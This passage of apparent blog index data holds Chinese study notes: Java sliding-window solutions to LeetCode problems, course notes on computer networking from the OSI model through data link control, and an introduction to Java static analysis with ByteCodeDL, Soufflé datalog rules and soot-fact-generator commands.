(need.get(d).equals(window.get(d))) &#123;                      // 只有当 window[d] 内的出现次数和 need[d] 相等时，才能 -1                        valid--;                    &#125;                    window.put(d, window.get(d) - 1);                &#125;            &#125;        &#125;// 返回最小覆盖子串        return len == Integer.MAX_VALUE ? &quot;&quot; : s.substring(start, start + len);    &#125;\n\nleetcode-567 字符串的排列\n这里实际上判定窗口收缩的条件就是窗口大小和子串大小一样的时候（因为子串是作为排列用，窗口中不能含有子串中没有的元素）\n然后根据 valid 是否符合要求了来判断有没有找到符合条件的排列子串\npublic boolean checkInclusion(String s1, String s2) &#123;        HashMap&lt;Character, Integer&gt; need = new HashMap&lt;&gt;();        for (int i = 0; i &lt; s1.length(); i++) &#123;            char c = s1.charAt(i);            need.put(c, need.getOrDefault(c, 0) + 1);        &#125;        HashMap&lt;Character, Integer&gt; window = new HashMap&lt;&gt;();        int left = 0, right = 0;        int valid = 0;        while (right &lt; s2.length()) &#123;            char c = s2.charAt(right);            right++;            if (need.containsKey(c)) &#123;                window.put(c, window.getOrDefault(c, 0) + 1);                if (window.get(c).equals(need.get(c))) &#123;                    valid++;                &#125;            &#125;            // 收缩条件，窗口大小和子串长度一样时            if (right - left == s1.length()) &#123;                if (valid == need.size()) &#123;                    return true;                &#125;                char d = s2.charAt(left);                left++;                if (need.containsKey(d)) &#123;                    if (need.get(d).equals(window.get(d))) &#123;                        valid--;                    &#125;                    window.put(d, window.get(d) - 1);                &#125;            &#125;        &#125;        return false;    &#125;\n\nleetcode-438 找到字符串中所有字母异位词\n直接套模板即可\npublic List&lt;Integer&gt; findAnagrams(String s, String p) &#123;        HashMap&lt;Character, Integer&gt; need = new HashMap&lt;&gt;();        for (int i = 0; i &lt; p.length(); i++) &#123;            char c = p.charAt(i);            need.put(c, need.getOrDefault(c, 0) + 1);        &#125;        HashMap&lt;Character, Integer&gt; window = new HashMap&lt;&gt;();        int left = 0, right = 0;        LinkedList&lt;Integer&gt; res =  new LinkedList&lt;&gt;();        int valid = 0;        while (right &lt; s.length()) &#123;            char c = s.charAt(right);            right++;            if (need.containsKey(c)) &#123;                window.put(c, window.getOrDefault(c, 0) + 1);                if (window.get(c).equals(need.get(c))) &#123;                    valid++;                &#125;            &#125;            if (right - left == p.length()) &#123;                if (valid == need.size()) &#123;                    res.add(left);                &#125;                char d = s.charAt(left);                left++;                if (need.containsKey(d)) &#123;                    if (need.get(d).equals(window.get(d))) &#123;                        valid--;                    &#125;                    window.put(d, window.get(d) - 1);                &#125;            &#125;        &#125;        return res;    &#125;\n\nleetcode-3 无重复字符的最长子串\n这题只需要注意什么时候扩张窗口（遍历s时），什么时候收缩窗口（当 window 中记录的字符出现2次以上时），以及什么时候更新返回值（当收缩窗口结束的时候更新）\npublic int lengthOfLongestSubstring(String s) &#123;        int left = 0, right = 0;                HashMap&lt;Character, Integer&gt; window = new HashMap&lt;&gt;();        int res = 0;        while (right &lt; s.length()) &#123;            char c = s.charAt(right);            right++;            // 记录             window.put(c, window.getOrDefault(c, 0) + 1);                        // 收缩窗口            while (window.get(c) &gt; 1) &#123;                char d = s.charAt(left);                left++;                window.put(d, window.get(d) - 1);            &#125;            // 收缩完后更新            res = Math.max(res, right-left);        &#125;        return res;    &#125;\n\nleetcode-1658 将 x 减到 0 的最小操作数\n这里题意是让我们通过减去数组边缘的值来使得和为 x ，且尽可能使得操作数小。我们的目标可以转换为寻找最长子数组和为 num.sum - x  \n\n1、当窗口内元素之和小于目标和 target 时，扩大窗口，窗口内元素\n2、当窗口内元素之和大于目标和 target 时，缩小窗口，空余出更多可替换次数。\n3、当窗口内元素之和等于目标和 target 时，找到一个符合条件的子数组，我们想找的是最长的子数组长度\n\nPS：这里明确了元素值为大于 0. 的值，因此可以通过扩大和缩小窗口来实现和的增减；而如果值为负的话，则无法适用于该算法（应使用前缀和 + 哈希表的思路）\npublic int minOperations(int[] nums, int x) &#123;        int n = nums.length, sum = 0;        for (int i = 0; i &lt; n; i++) &#123;            sum += nums[i];        &#125;        int target = sum - x;        int left = 0, right = 0;        int window = 0;        int len = Integer.MIN_VALUE;        while (right &lt; n) &#123;            window += nums[right];            right++;                        // shrink 这里注意左右边界            while (window &gt; target &amp;&amp; left &lt; right) &#123;                window -= nums[left];                left++;            &#125;            if (window == target) &#123;                // update                len = Math.max(len, right-left);            &#125;        &#125;        return len == Integer.MIN_VALUE ? -1 : n - len;    &#125;\n\nleetcode-713 乘积小于 K 的子数组\n这里滑动思路和前面一样，但是在更新记录符合条件的窗口值时要考虑子集的情况\n\n比方说 left = 1, right = 4 划定了 [1, 2, 3] 这个窗口（right 是开区间）但不止 [left..right] 是合法的子数组，[left+1..right], [left+2..right] 等都是合法子数组所以我们需要把 [3], [2,3], [1,2,3] 这 right - left 个子数组都加上\nPS： 对于 [1] [2] 和 [1,2] 在上一轮更新时已被记录\n\npublic int numSubarrayProductLessThanK(int[] nums, int k) &#123;        int left = 0, right = 0;        int window = 1;        int count = 0;        while (right &lt; nums.length) &#123;            window *= nums[right];            right++;            while (window &gt;= k &amp;&amp; left &lt; right) &#123;                window /= nums[left];                left++;            &#125;            //  这里必然符合条件            count += right - left;        &#125;        return count;    &#125;\n\nleetcode-1004 最大连续1的个数 III\n还是之前的三个问题，能回答出来就能写\n\n1、当可替换次数大于等于 0 时，扩大窗口，让进入窗口的 0 都变成 1，使得连续的 1 的长度尽可能大。\n2、当可替换次数小于 0 时，缩小窗口，空余出可替换次数，以便继续扩大窗口。\n3、只要可替换次数大于等于 0，窗口中的元素都会被替换成 1，也就是连续为 1 的子数组，我们想求的就是最大窗口长度。\n\npublic int longestOnes(int[] nums, int k) &#123;        int left = 0, right = 0;        int windowOneCount = 0;        int len = 0;        while (right &lt; nums.length) &#123;            if (nums[right] == 1) &#123;                windowOneCount++;            &#125;            right++;            // 当窗口内 0 的数目超过 k 个后            while (right - left - windowOneCount &gt; k) &#123;                if (nums[left] == 1) &#123;                    windowOneCount--;                &#125;                left++;            &#125;            // 这时一定是符合条件的            len = Math.max(len, right - left);        &#125;        return len;    &#125;\n\nleetcode-424 替换后的最长重复字符\n这道题和上一题的区别在于需要自己选择替换的字符，所以这里借助一下统计数组，每次替换都是用的字符统计数量最大的。\n注意，在窗口收缩的时候，要保证最大的重复子串长度不变 windowSize (可以用 k 替换的，所以这里只变化 left)\npublic int characterReplacement(String s, int k) &#123;        int left = 0, right = 0;        int windowSize = 0;        int[] count = new int[26];        int len = 0;        while (right &lt; s.length()) &#123;            char c = s.charAt(right);            right++;            count[c - &#x27;A&#x27;]++;            windowSize = Math.max(windowSize, count[c - &#x27;A&#x27;]);\t\t\t// shrink            while (right - left - windowSize &gt; k) &#123;                char d = s.charAt(left);                count[d - &#x27;A&#x27;]--;                left++;            &#125;                    len = Math.max(len, right - left);        &#125;        return len;    &#125;\n\nleetcode-219 存在重复元素 II\n这道题可以维护一个窗口大小为 k 的 HashSet，当添加一个新元素的时候只要判断是否包含就能说明肯定满足题意。另外，当窗口大小大于 k 时缩小窗口，小于 k 时就增大窗口\npublic boolean containsNearbyDuplicate(int[] nums, int k) &#123;        int left = 0, right = 0;        HashSet&lt;Integer&gt; window = new HashSet&lt;&gt;();        while (right &lt; nums.length) &#123;            if (window.contains(nums[right])) &#123;                return true;            &#125;            window.add(nums[right]);            right++;            if (right - left &gt; k) &#123;                window.remove(nums[left]);                left++;            &#125;        &#125;        return false;    &#125;\n\nleetcode-220 存在重复元素 III\nTODO 这道题在判断元素之差时需要借助二叉搜索树\n\nleetcode-395 至少有 K 个重复字符的最长子串\n这道题的关键在于如何自己构造一个阈值来判断什么时候增大窗口，什么时候缩小窗口；至少有 K 个重复字符，题意并未说明字符种类的限制，那么我们可以遍历 1-26 种类的字符对应的满足条件的最长子串长度，其中最大值一定就是题解。这样每一轮循环设置一个种类数量限制，小于该限制时窗口增大，大于时窗口减小。\nclass Solution &#123;    public int longestSubstring(String s, int k) &#123;        int len = 0;        // 穷举遍历所有字符种类下对应的最长子串长度        for (int i = 1; i &lt;= 26; i++) &#123;            len = Math.max(len, logestKLetterSubstr(s, k, i));        &#125;        return len;    &#125;    private int logestKLetterSubstr(String s, int k, int i) &#123;        // 返回长度        int res = 0;        int left = 0, right = 0;                // 统计字符次数        int[] count = new int[26];        // 窗口中出现的字符个数        int windowCountSize = 0;        // 窗口中达标的字符个数，即出现次数大于等于 k 的个数        int windowValidSize = 0;        while (right &lt; s.length()) &#123;            char d = s.charAt(right);            if (count[d - &#x27;a&#x27;] == 0) &#123;                windowCountSize++;            &#125;            count[d - &#x27;a&#x27;]++;            if (count[d - &#x27;a&#x27;] == k) &#123;                windowValidSize++;            &#125;            right++;            // 当字符种类大于 i 时，缩小窗口            // 这里应该用 while 而不是 if ，因为移除的元素不一定会是的 count 减小            while (windowCountSize &gt; i) &#123;                char p = s.charAt(left);                if (count[p - &#x27;a&#x27;] == k) &#123;                    windowValidSize--;                &#125;                count[p - &#x27;a&#x27;]--;                if (count[p - &#x27;a&#x27;] == 0) &#123;                    windowCountSize--;                &#125;                left++;            &#125;            // 更新参数            if (windowValidSize == i) &#123;                res = Math.max(res, right - left);            &#125;        &#125;        return res;    &#125;&#125;\n\n\n参考链接[1] https://labuladong.github.io/\n","tags":["基础"]},{"title":"计算机网络笔记","url":"/2023/03/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%94%E8%AE%B0/","content":"[TOC]\n写在前面期末考试最终成绩 94，总评 90，说明这个笔记归纳的还算蛮成功的。一些诸如 ICMP、IGMP、IP 组播之类的知识点因为考试非重点并未记录上来，以后如果遇见再做补充\n\nCh1 绪论基本概念 什么是数据通信 结构/ 传输模式 / 物理结构 点到点/多点 / 拓扑结构 / 网络规模分类 覆盖范围，每种网络的大概协议标准类型 / 协议和标准 三要素\n\n基本概念\n数据通信：在两台设备之间通过诸如线缆的某种形式的传输介质进行的数据交换\n效率四要素：传递性、准确性、及时性和抖动性\n\n五个组件——通信五元组\n报文 发送方 接收方 传输介质 协议\n\n功能\n\n数据通信\n资源共享：包括硬件 软件 数据\n\n\n数据流传输模式：\n单工 半双工 全双工\n\n物理结构之连接类型\n\n点对点连接：提供两台设备之间的专用的链路。链路全部的能力均为两台设备之间的传输所共用。\n多点连接：两台以上设备共享单一链路。分空间上共享与时间上共享\n\n\n分类\n\n按分布范围分从大到小 WAN MAN LAN PAN\n每种类型网络覆盖范围，里面大概有哪些网络\n\n按拓扑结构 这块还需要重点看\n\n总线型\n由一条较长的线缆作为主干来连接网络上的所有设备\n由于存在分接头信号反射的问题，因此不易进行故障的排查\n\n\n星型\n由集线器作为中央控制器，不允许设备之间有直接的连接\n\n\n环型\n每台设备只与其两侧的设备进行专用点到点连接\n\n\n网状型\n各台设备之间都有一条专用的点到点链路\n\n\n混合型\n\n\n\n\n协议\n核心部分 用来管理数据通信的一组规则\n\n语法 数据的结构或格式\n语义 每一个字段的含义，通常包括用于相互协调及差错处理的控制信息\n\n时序：报文发送的时间和速率\n\n\n\n标准化工作\n\n​    标准的分类\n\n法定标准（权威机构） =&gt; OSI\n事实标准（某些公司主流产品形成的主流） =&gt; TCP/IP\n\n\nRFC 因特网标准的形式\n\n相关组织\n国际标准化组织 ISO   OSI\nITU IEEE IETF\n\n\n\n性能指标\n\n速率 数据传输率/比特率连接在计算机网络上的主机在数字信道上传送数据位数的速率\n\n带宽 原本指信号的频率极差，这里指单位时间内两点之间的最高数据率理想的数据传输状态\n\n吞吐量单位时间内通过某个网络（或信道、接口）的数据量\n受网络的带宽或网络的额定速率的限制\n\n时延数据从网络的一端传送到另一端所需的时间 =&gt; 延迟\n\n\n时延带宽积 表征的就是某一段时间的数据容量\n\n时延带宽积=传播时延\\times 带宽\n\n往返时延RTT\n从发送方发送数据开始，到发送方收到接收方的确认，总共经历的时延\n\n利用率\n\n信道利用率\n\n网络利用率\n\n\n\n\n\n\n\nCh2 网络模型为什么需要分层，哪几层，每一层做什么，层与层之间的关联性\n\n分层结构为什么要分层？\n\n\n\n下层为上层提供服务，上层使用下层的服务（包括下面的所有服务），通过接口来说明如何使用下层的服务（屏蔽了服务的实现实现细节，仅相邻层间有接口）；对等实体与协议的定义建立在水平方向上。\n\n服务数据单元和协议数据单元的概念：上一层的PDU作为下一层的SDU单元\n\n\nOSI参考模型\n\nOSI 七层\n\n下面是通信过程的例子，实际体现的是数据封装和解封装的过程，上层的协议数据单元在向下进行传递时会添加控制信息，特别注意在第二层头部和尾部都会有添加，而物理层只负责传递 01 比特流\n\n\n🚩各层功能和相应协议\n\n应用层负责向用户提供服务\n\n表示层负责翻译、加密和压缩数据\n功能一：数据格式变换\n功能二：数据加密解密\n功能三：数据压缩和恢复 传输音视频数据时\n\n会话层\n负责对话控制（允许两系统会话及会话方式控制）和同步（增加检查点或同步点）\n向表示层实体/用户进程提供建立连接并在连接上有序地传输数据\n这里的建立连接是在进程层面。建立连接实际就是建立一个会话（建立同步），不同的应用程序通信之间建立不同的会话而不会相互影响\n功能一：建立、管理、终止会话\n功能二：使用校验点可使会话在通信失效时从校验点/同步点继续恢复通信，实现数据同步\n\n传输层负责报文从一个进程到另一个进程的传递\n功能一：可靠传输、不可靠传输\n功能二：差错控制\n功能三：流量控制\n功能四：复用分用复用：多个应用层进程可同时使用下层的服务分用：下层把收到的信息分别交付给上面应用层中相应的进程\n\n网络层\n负责将各个分组从源地址传递到目的地址\n这里注意如果两个系统使用同一链路来连接，则通常不需要网络层\n分组是数据报在过长时进行分割的处理\n功能一：路由选择\n功能二：逻辑寻址\n\n数据链路层\n负责帧从一节点到下一节点传递\n传输单位是帧\n功能一：成帧（定义帧的开始和结束）\n功能二：差错控制  帧错+位错\n功能三：流量控制\n功能四：访问（接入）控制 控制对信道的访问\n\n物理层\n负责位从一个节点到另一个节点的传递\n传输单位是比特\n透明传输：不管数据是什么样的比特组合，都应当能在链路上传送\n功能一：定义接口特性 指的物理等特性\n功能二：定义传输方式 单工、半双工、全双工\n功能三：定义传输速率\n功能四：比特同步\n功能五：比特编码 编码成电信号或光形式的规则\n\n\n\n\n\n\nOSI 与 TCP/IP\n\n\nTCP/IP 中最底下是主机到网络层\n\n\n相同点\n\n都分层\n\n\n\n\n基于独立的协议栈的概念\n可以实现异构网络互联\n\n\n\n\n不同点 \n\n\n\n\n5层参考模型\n\n\n寻址\n\n物理地址 - 物理层和数据链路层\n\n逻辑地址 - 网络层\n\n端口地址 - 传输层\n跳到跳时物理地址将改变，但逻辑地址和端口地址保持不变\n\n专用地址 - 应用层\n\n\n\n\nCh3 数据和信号模拟与数字数据 / 模拟信号与数据信号 / 振幅频率相位波长，频率与周期之间的关系 / 带宽 / 什么是调幅调频调相 / 衰减 失真 噪声 / 信噪比的概念和公式 / 无噪声信道和有噪声信道速率的限制\n\n数据通信基础\n数据要进行传输，必须被转换为电磁信号\n\n典型的数据通信模型        \n调制解调器将数字信号转换为模拟信号\n\n\n相关术语\n\n基带传输：数字信号不经调制直接在低通通道传送\n带通传输：把数字信号转换成模拟信号进行传输，允许使用带通通道\n\n\n\n码元、波特、速率、带宽\n\n码元\n\n\n速率、波特、带宽\n速率指传输的速率，是将数据发送到链路上的速度；区别于传播速率，后者指整个链路上进行传播的速度\n电平与位的表示关系：\n\nNumber\\ of \\ bits\\ per\\ level=log_2M=k\n码元传输速率：单位时间数字通信系统传输的码元个数（脉冲个数或信号变化的次数），单位是波特。码元速率与进制数无关\n\n信息传输速率：单位时间内数字通信系统传输的二进制码元个数（比特数）\n关系：\n\n\n\n带宽：单位时间两点之间所能通过的“最高数据率”\n信号上的定义：复合信号最高频率与最低频率的差值\n\n\n\n\n数据速率限制\n影响因素：有效带宽、使用的信号电平数、通道的质量（噪声电平）\n\n奈氏准则 香农定理\n传输减损！\n\n衰减\n\n热转换导致能量损失，可通过放大器恢复\n\n\n噪声\n\n失真\n信号中各成分由于传播速度随频率不同而存在延迟的差异，导致接收信号相位变化\n码间串扰：接收端收到的信号波形失去了码元之间清晰界限的现象\n解决方案：奈奎斯特定理 给出所需的信号电平数 会出计算题 🚩\n\n限制码元传输速率的上限，区别于香农定理，下面是极限数据传输率：\n\n\n码元传输速率存在上限\n信道的频带越宽（W），就可以用更高的速率进行码元的有效传输\n奈氏准则并未对信息传输速率给出限制\n想提高数据的传输速率，采用多元制的调制方法\n\n\n香农定理 定义了理论上的最高数据速率\n考虑了噪声的影响，引入信噪比的概念\n\n注意单位的不同 dB 和 S/N。如果题目中给的是以 dB 为单位的参数，先换算\n\n信噪比(dB)=10log_{10}(S/N)\n结论：\n\n\n两者区别\n奈氏准则针对的是信号本身特性存在的问题而提出的解决方案，香农定理考虑的是外界的噪声影响。\n如果题目中既提到了进制数，又提到了信噪比，就都要算，取最小值\n\n\n\n\n\nCh4 数字传输波形图 / 比特率 位长 数据率和信号率的关系公式 / 基带传输 低通 / 基带传输和宽带传输的区别 / 最小带宽 最大数据速率 / 编码方案\n\n编码&amp;调制\n\n数据元素和信号元素\n前者为信息的最小实体，后者为数字信号的最小单位\n\n数据速率与信号速率\n信号速率决定了数字信号的带宽，最小带宽与波特率相等；给定带宽，即可求得最大数据速率\n\nS=c\\times N\\times \\frac{1}{r}\n基带信号与宽带信号的区别 可能出简答题？\n\n宽带调制的目的是应对衰减等问题\n传输距离较近时采用基带传输；远时采用宽带传输\n\n编码与调制\n区分编码与调制的区别：\n\n\n数字数据编码为数字信号 用于基带传输\n编码解决的问题：\n\n基线 信号功率的运行平均值\n\n基线偏移 \n\n直流分量 接近于零频率的成分\n自同步\n\n线路编码方案\n\n单极 NRZ 方案 \n\n\n极性 NRZ-L 方案和极性 NRZ-I 方案 前者存在基线偏移，都存在直流分量\nNRZ-L 电平决定位值；NRZ-I 电平是否跳变决定位值\n\n\n极性 RZ\n两个信号变化编码一个位，所需带宽大 但没有DC直流成分问题\n\n\n曼彻斯特编码和差分曼彻斯特 必考\n曼彻斯特：位的持续时间被二等分，前半部分电平保持一个水平，后半部分变成另外一个水平\n差分：中间总有跳变，值在位起始位置确定\n最小带宽（信号速率）是 NRZ 的两倍\n\n\n双极型方案\n使用三种电平\n\nAMI \n0电平表示0，交替正负电平表示1\n\n伪三元编码\n1编码成0电平，0编码成正负交替电平\n\n\n\n没有 DC 成分，有同步问题\n\n多电平方案\nmBnL\n这里的 m 和 n 分别指的是模式长度，比如 m 个二进制位需要 n 个电平（信号模式）来表示\n4D-PAM5\nMLT-3 可能考？最后看下吧\n\n\n块编码 \n利用冗余（增加分组的位长）来提供差错检测    \n三步骤：分组、置换和组合\n扰动 \n修改 AMI 的编码规则，改变其长0导致同步失效的问题 \nB8ZS：8个连续0电平会被替换成000VB0VBV表示违反，与前一非零脉冲极性相同 ；B表示双极，与前一非零脉冲极性相反\nHDB3\n\n异步传输与同步传输\n异步传输：信号的时序不重要，位流组成字节单位，没有同步时钟所以需要额外增加起始和终止位，字节之间存在间隙\n同步传输：位流组成更长的“帧”，包含多个字节。帧内的各字节之间没有间隙\n\n\n\nCh5 模拟传输\n\n三种将数字数据调制成数字信号的机制 / 模拟到模拟到转换\n\n数字数据调制为模拟信号\n\n幅移键控 ASK\n\n频移键控 FSK\n\n相移键控 PSK\n\n🚩正交振幅调制 QAM （ASK + PSK）\n状态数：相位数x幅度数\n\n\n\n模拟数据调制为模拟信号 \n目的：为了适应带通介质\n载波的某一参量随调制信号的振幅变化\n\n调幅\n调频\n调相\n\n\n模拟数据编码为数字信号\n\n三个步骤：\n\n编码指将每个电平值对应的状态（也就是码元）用二进制位来表示\n\n\n\n传输方式\n\n并行模式 速度快 费用高 适合近距离（计算机内部）\n串行模式  速度慢 费用低 适合远距离\n\n\n\nCh6 物理层面的带宽利用带宽利用的方法，每种的大概原理\n\n频分复用 FDM 模拟技术 调制载波频率\n\n波分复用 WDM 合并多个光信号 本质与FDM一样，差别就是这些频率非常高\n\n时分复用 TDM 数字复用技术\n\n同步时分复用 \n想象成一个高速复用链路，只要将时隙送上去，速度（链路速率）即会提高为之前（单个连接数据速率）的 n 倍，n 指的是连接数。每个输入时隙进一步拼接成帧。\n每个输出单元的持续时间是输入单元持续时间的1/n\n每位的持续时间是帧持续时间的 1/n （n 指的是帧长）\n同步的特点在于每个时隙依次专用于每一个发送设备，固定。\n\n统计时分复用\n解决空时隙问题。增加寻址信息\n动态分配时隙\n\n\n\n扩频技术\n与复用技术的原理类似，也是信号的组成，但是目的在于抗干扰和安全。这里组成的信号成分中包含冗余信息\n\n跳频扩频 FHSS\n源信号调制 M 个不同的载波频率\n\n直接序列扩频 DSSS\n每个数据位用扩展编码的 n 位代替（数字数据 =&gt; 数字信号）\n\n\n\n\nCh7 物理层传输介质数据传输系统中在发送设备和接收设备之间的物理通路\n区别传输媒体和物理层的概念\n\n分类：\n\n\n双绞线\n两根采用一定规则并排绞合的、相互绝缘的铜导线组成 =&gt; 常用于局域网\n如果再加一个金属丝作屏蔽层，就是屏蔽双绞线\n\n同轴电缆 =&gt; 常用于传统总线型以太网\n\n抗干扰能力强于双绞线\n\n光纤\n传递光脉冲，带宽很大\n损耗低，适合远距离传输\n\n\nCh8 交换电路交换的三个阶段 / 数据交换过程有哪些延迟 / 虚电路的概念，基本原理 / 虚电路交换和电路交换之间的优劣\n\n三种交换方式\n\n电路交换 \n分组交换 区别 概念\n数据报网\n虚电路网 \n\n\n报文交换\n\n\n数据交换方式\n\n电路交换\n电路交换的三个阶段\n数据交换过程中有哪些延迟？传输延迟 + 传播延迟 + 处理延迟（忽略），对应图\n常用于电话网络 直接传输比特流\n为了减少带宽的浪费，所以通过多路复用技术来缓解。但是本质上会独占通信链路\n\n电路交换中的中间设备（通常是交换机）会直接对发送数据进行转发，而不会检错\n\n报文交换\n交换设备采用存储转发技术，动态分配线路\n\n分组交换\n分组：把大的数据块分割成小的数据块\n相对于报文交换，存储管理更容易\n报文交换于分组交换的对比：\n分组交换在计算时直接考虑最后一个分组发送完毕所需时间即可\n\n三种方式对比：\n报文交换和分组交换都是基于存储转发\n\n\n数据报方式 （无连接服务）\n数据报\n\n\n虚电路方式（连接服务）\n虚电路的基本原理\n电路交换与虚电路交换的优劣\n在数据链路层实现\n结合数据报方式和电路交换方式 \n\n编址\n全局地址用于连接阶段建立虚电路标识符 VCI；后者仅具有本地的权限（定义下一个交换机和传送分组的通道应该是什么）\n\n连接建立阶段\n分为建立请求和确认子阶段\n\n\n🚩与电路交换之间的优劣对比\n电路交换：\n\n\n电路交换是在物理层，是实际的物理链路连接。\n通信开始前，数据传输直接以信号数据流传递，无封装过程\n站点必须对通信时间所用的资源给以预留\n数据传输期间没有寻址，交换机基于它们占有的频带（FDMA）或时隙（TDMA）发送数据\n效率较低，延迟很小\n\n\n虚电路交换：\n\n\n属于相同源端和目的端的所有分组都按同一路径传送\n资源按需分配，分组到达目的端可能有不同延迟\n\n\n\n\n\n\n\n\n\n\nCh10 检错与纠错\n基本概念\n\n块编码 \n\n汉明距离的相关结论\n线性块编码 \n汉明编码\n奇偶校验码\n\n\n\n\n循环编码 计算\n\n传输、网络层的校验和的计算\n\n差错控制（检错编码）\n\n差错控制在数据链路层主要是解决比特错\n\n基本概念：\n\n汉明距离\n两个字进行异或并计算1的个数\n\n检错的最小距离\n最多可检 s 个差错：$d_{min}\\geq s+1$\n\n\n纠错的最小距离\n最多纠正 t 个差错：$d_{min}=2t+1$\n\n\n\n\n\n检错编码：\n\n奇偶校验码\n\n特点：\n只能检查出奇数个比特错误，检错能力为50%\n\nCRC循环冗余码\n怎么运算？硬件实现不需要 找两道相关题练一下\n除的过程采用异或运算，得到的是3位，1位额外位移下来加上去组成4位\n当最左边的位是0时，用0做除数\n发送端：\n\n接收端：\n\n区别于可靠传输，这里只是实现了无比特差错的传递\n\n\n纠错编码——汉明编码\n发现双比特错，纠正单比特错 $d_{min}=3$\n\n确定校验码的位数 r\n\n2^r \\geq k+r+1\\\\\n2^r \\geq n+1r 为冗余信息位，k 位信息位\n\n查表计算校验子\n\n\n\n\n校验和\n划分 求和 取反\n\n\nCh11 数据链路控制非常重要！！\n没有大题，都是概念 11.1 11.2 11.3 \n\n11-1 成帧\n\n两种不同类型的帧\n\n固定长度 长度本身作为分隔符\n\n可变长度 加入标记\n\n面向字符协议\n帧的开头和结尾加入1字节的标记\n字节填充：如果数据部分出现标记字符，则用转义字符 ESC 进行填充\n\n面向位协议\n通常使用标记 01111110 作为分隔符\n位填充策略：遇到1个0后面紧跟着5 个1时便添加一个0\n\n\n\n\n\n\n\n11-2 流量控制和差错控制 =&gt; 数据链路控制\n\n流量控制\n定义：一系列程序，用来限制发送方在等到确认之前发送的数据数量\n\n差错控制 「基于自动重复请求 ARQ」\n\n\n\n11-3 几种协议\n\n\n无噪声通道 \n\n不使用流量控制\n发送方只管发\n\n使用流量控制\n「停止等待协议」\n利用 ACK 帧的反馈确认再继续发送帧\n\n链路利用率：\n\nU=\\frac{n\\times t_{frame}}{n(2t_{prop}+t_{frame})}=\\frac{1}{2a+1}「滑动窗口协议」\n\n一次传输多个帧，需要利用序号作为标记，发送方和接收方均维护一个序号列表\n链路利用率：\n\nU=\\begin{cases}\n1 \\ (W\\geq2a+1)\\\\\n\\frac{W}{2a+1}\\ (W","tags":["基础"]},{"title":"静态分析实战 之 ByteCodeDL 篇","url":"/2023/04/08/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%20%E4%B9%8B%20ByteCodeDL%20%E7%AF%87/","content":"静态分析实战 之 ByteCodeDL 篇写在前面看了那么多篇 paper ，最终还是要回归到代码上，从几个开源项目练手\nPre. 前置知识先来回顾一下 datalog 的静态分析模型吧：\n\nhttps://racerz-fighting.github.io/2023/01/04/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/#03-Data-Flow-Analysis-I\nhttps://ranger-nju.gitbook.io/static-program-analysis-book/ch4/04-02-datalog-based-pa\n\nsouffle 引擎的入门以及规则参考：\n\nhttps://mp.weixin.qq.com/s?__biz=MzUyOTkwNTQ5Mg==&amp;mid=2247487087&amp;idx=1&amp;sn=4ce42ac78f232a7d3fce13d6ed06c44e&amp;chksm=fa58ac54cd2f254205e557f4cc9f5857d2a384bc89a36b15bf87212d50f52c2d51a8cef3c34f&amp;scene=21#wechat_redirect\nhttps://y4er.com/posts/bytecodedl/#%E7%8E%AF%E5%A2%83\n\nByteCodeQL 规则和语法参考：\n\nhttps://github.com/BytecodeDL/ByteCodeDL/tree/main/docs\n\n简单来说，souffle 的作用就是根据已有的 facts (EDB) 和预设值的规则 (dl文件) 遍历产生新的 facts \nsouffle -F. -D. example.dl\n\n其中， -F 指定了facts所在的目录，而 -D 制定了输出目录， example.dl 为datalog文件\n\n因此我们还需要辅助生成 facts 的工具：soot-fact-generator\n\n\n常用命令：\n# 如果不使用--facts-subset，soot只会加载-i指定的class；使用了--facts-subset，则生成的fact就会根据--facts-subset的值来选择性生成java -Dfile.encoding=UTF-8 -Xmx32G -jar soot-fact-generator.jar -i classbean.jar -l ./rt.jar --full -d out_dir --allow-phantom --generate-jimple --facts-subset APP --ignore-wrong-staticness --debug# 如果想使用当前java环境下的rt.jar/jce.jar/jsse.jar，可以直接使用-lsystem选项代替-l ./rt.jar；--ssa就是生成SSA格式的IR，但是速度会很慢，并且很可能会因内存溢出而程序崩溃；java -Dfile.encoding=UTF-8 -Xmx32G -XX:-UseGCOverheadLimit -jar soot-fact-generator.jar -i classbean.jar -i classes.jar -lsystem --full -d out_dir --allow-phantom --generate-jimple --facts-subset APP --ignore-wrong-staticness --ssa --lowMem --debug# 禁用GC开销检查，如果使用--ssa选项，可以开启这个选项-XX:-UseGCOverheadLimit--application-regex 设置Class过滤规则，可以设置固定的ClassName，也可以设置ClassName全限定名的前缀、包前缀；例如：java.lang.String.class/java.lang.*/java.lang.St.**/**，如果设置了**，则代表所有ClassName都可以通过；-idir 批量添加指定目录下的jar文件，也就是批量指定-i选项；--facts-subset 共三个可选项：APP、APP_N_DEPS、PLATFORM，如果不指定，则soot只会加载-i指定的jar包中的class；APP选项soot会加载-i和-l指定的；APP_N_DEPS选项soot会加载-i、-l和-ld指定的；PLATFORM选项soot会加载-l指定的；但是最后soot生成的fact范围，是遵从选项的字面意思的；--also-resolve 这个选项也很重要，相当于soot.Scene#addBasicClass(extraClass, SootClass.BODIES),如果有一些class无法被soot分析，可以把他加入到基本类中；--allow-phantom 是否支持Java中的幻象引用；--ignore-wrong-staticness 是否忽略fact创建过程中的 wrong static-ness 错误；\n\ntips： soot-fact-generator在macos上运行时，如果 jar 包中存在 XML 文件可能会卡死，这应该是 rt.jar 中 XML 解析的 bug，暂未发现具体原因。\n\n\n\n\n查看 facts 文件可以看到每个函数的相关信息，以 \\t 分隔。同时还记录了 method call 的行号\n\n0. 内置谓词的利用 ——  查找特定条件的类\n前置\n\nJimple 中的表示\n\nsouffle 提供的谓词 \nhttps://souffle-lang.github.io/constraints\n\ncontains(string1, string2)\nis used to check if the latter string contains the former string\n\nmatch(&quot;a.*&quot;,x)\n is used to check if the latter string matches a wildcard pattern specified in the former string\n\n\n\n\n需求 exp\n\n我只想找有两个构造参数的类，其中一个传入的还得是数组参数\nMethodInfo(method:Method, simplename:symbol, param:symbol, class:Class, return:Class, jvmDescriptor:symbol, arity:number)\n\n构建规则：\n\n方法为构造函数，simplename = &lt;init&gt;\n构造参数有两个，arity = 2\n参数类型为数组， contains(&quot;[]&quot;, param)\n\n#include &quot;inputDeclaration.dl&quot;.decl QueryResult(class:Class, method:Method).output QueryResultQueryResult(class, method) :- \tMethodInfo(method, simplename, param, class, _, _, arity), \tsimplename = &quot;&lt;init&gt;&quot;, \tcontains(&quot;[]&quot;, param), \tarity = 2.\n\ntest\nsouffle -F ../../../example/out/ -D . query_test.dl 